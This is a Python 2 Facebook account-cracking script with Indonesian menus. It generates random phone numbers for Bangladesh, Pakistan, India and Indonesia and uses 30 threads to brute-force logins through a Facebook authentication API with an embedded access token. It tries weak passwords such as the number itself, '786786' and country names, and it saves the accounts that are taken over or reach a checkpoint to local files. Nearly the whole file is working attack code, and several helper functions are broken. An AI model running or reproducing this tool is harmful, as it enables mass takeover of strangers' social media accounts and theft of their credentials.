#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests, mechanize

os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
    

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
    

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Keluar'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


logo = '''
\033[1;94m ██████\033[1;97m╗\033[1;94m██\033[1;97m╗      \033[1;94m██████\033[1;97m╗ \033[1;94m███\033[1;97m╗   \033[1;94m██\033[1;97m╗\033[1;94m███████\033[1;97m╗
\033[1;94m██\033[1;97m╔════╝\033[1;94m██\033[1;97m║     \033[1;94m██\033[1;97m╔═══\033[1;94m██\033[1;97m╗\033[1;94m████\033[1;97m╗\033[1;94m  ██\033[1;97m║\033[1;94m██\033[1;97m╔════╝
\033[1;94m██\033[1;97m║     \033[1;94m██\033[1;97m║     \033[1;94m██\033[1;97m║   \033[1;94m██\033[1;97m║\033[1;94m██\033[1;97m╔\033[1;94m██\033[1;97m╗ \033[1;94m██\033[1;97m║\033[1;94m█████\033[1;97m╗  
\033[1;94m██\033[1;97m║     \033[1;94m██\033[1;97m║     \033[1;94m██\033[1;97m║   \033[1;94m██\033[1;97m║\033[1;94m██\033[1;97m║╚\033[1;94m██\033[1;97m╗\033[1;94m██\033[1;97m║\033[1;94m██\033[1;97m╔══╝  
\033[1;97m╚\033[1;94m██████\033[1;97m╗\033[1;94m███████\033[1;97m╗╚\033[1;94m██████\033[1;97m╔╝\033[1;94m██\033[1;97m║ ╚\033[1;94m████\033[1;97m║\033[1;94m███████\033[1;97m╗
\033[1;97m ╚═════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝

\033[41;1m CREATOR : GI4N76 2004 \033[00;1m
'''
logo2 ='''
\x1b[1;92m191-192-193-194-195-196-197-198
199-185-115-195-165-155-175-165
'''
logo3 ='''
\x1b[1;92m355-334-335-336-337-338-339
351-352-325-355-315-345-305
'''
logo4 ='''
\x1b[1;92m905-755-995-855-935-965-975
755-965-915-855-925-905-925
'''
logo5 ='''
\x1b[1;92m951-331-953-954-955-956-520
521-522-523-899-858-813-878
'''

back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

os.system('clear')



def menu():
    os.system('clear')
    print logo
    print 40 * '\x1b[1;34m-'
    print '\x1b[1;97m(\x1b[1;32m01\x1b[1;97m)\x1b[1;97m Crack Number Handphone'
    print '\x1b[1;97m(\x1b[1;92m00\x1b[1;97m)\x1b[1;97m Keluar'
    print 40 * '\x1b[1;34m-'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('\n\x1b[1;97mEnter Number : ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Pilih yang bener anjing'
        pilih_menu()
    elif unikers == '1' or unikers == '01':
        crack_nomor()
    elif unikers == '0' or unikers == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m] Pilih yang bener anjing'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo
    print 40 * '\x1b[1;34m-\x1b[1;97m'
    print '\x1b[1;97m(\x1b[1;92m01\x1b[1;97m)\x1b[1;97m Crack Bangladesh'
    print '\x1b[1;97m(\x1b[1;92m02\x1b[1;97m)\x1b[1;97m Crack Pakistan'
    print '\x1b[1;97m(\x1b[1;92m03\x1b[1;97m)\x1b[1;97m Crack India'
    print '\x1b[1;97m(\x1b[1;92m04\x1b[1;97m)\x1b[1;97m Crack Indonesia'
    print '\x1b[1;97m(\x1b[1;92m00\x1b[1;97m)\x1b[1;97m Back      '
    print 40 * '\x1b[1;34m-\x1b[1;97m'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97mEnter Number :')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91mx\x1b[1;97m]\x1b[1;91m Pilihan Salah:('
        pilih()
    elif unikers == '1' or unikers == '01':
        bangla()
    elif unikers == '2' or unikers == '02':
        pakistan()
    elif unikers == '3' or unikers == '03':
        india()
    elif unikers == '4' or unikers == '04':
        indo()
    elif unikers == '0' or unikers == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m] Pilih yang bener anjing'
        pilih()

###### BANGLADESH ######

def bangla():
    os.system('clear')
    print logo
    print logo2
    print 40 * '\x1b[1;97m-'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Enter Number\x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Nomor \x1b[1;97m :\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Wait is taking an account' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n----------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/bangla1.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/bangla1.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' \xe2\x88\x86 ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/bangla1.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/bangla1.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bangladesh'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/bangla1.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/bangla1.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/bangla1.txt'
    print '\x1b[1;97m----------------------------------------'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    menu()

###### PAKISTAN ######

def pakistan():
    os.system('clear')
    print logo
    print logo3
    print 40 * '\x1b[1;97m-'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Enter Number\x1b[1;97m : \x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+92'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        rizky4()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number\x1b[1;97m :\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Wait is taking an account' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n----------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/pakistan.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/pakistan.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/pakistan.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/pakistan.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/pakistan.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/pakistan.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai.....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/pakistan.txt'
    print '\x1b[1;97m----------------------------------------'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    menu()


###### INDIA ######

def india():
    os.system('clear')
    print logo
    print logo3
    print 40 * '\x1b[1;97m-'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Enter Number\x1b[1;97m : \x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+91'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Wait is taking an account' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n----------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/india.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/india.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/india.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;92m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/bangla1.txt'
    print '\x1b[1;97m----------------------------------------'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    menu()
    
 ###### INDONESIA ######

def indo():
    os.system('clear')
    print logo
    print logo5
    print 40 * '\x1b[1;97m-'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Enter Number \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;96m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+628'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Back ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number  \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
    	print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Wait is taking an account' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n----------------------------------------'
    
    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/ind.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/ind.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Sayang'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/ind.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/ind.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Kontol'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/ind.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/ind.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mHACK\x1b[1;97m/\x1b[1;93mCHECK \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/ind.txt'
    print '\x1b[1;97m----------------------------------------'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    menu()


if __name__ == '__main__':
    menu()
